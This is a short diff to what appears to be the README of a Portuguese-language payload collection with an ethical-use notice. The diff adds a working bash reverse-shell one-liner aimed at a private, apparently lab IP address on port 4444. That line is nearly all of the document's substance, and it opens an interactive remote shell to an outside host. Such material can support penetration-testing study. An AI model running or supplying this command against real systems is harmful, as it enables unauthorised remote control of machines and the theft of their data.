@@ -1,6 +1,6 @@
 
 10.129.218.156
-
+bash -i >& /dev/tcp/10.129.218.156/4444 0>&1
 [![Uso Ético](https://img.shields.io/badge/usage-ethical--only-blue.svg)]
 # PAYLOADS
 Aviso de Uso Ético e Responsável
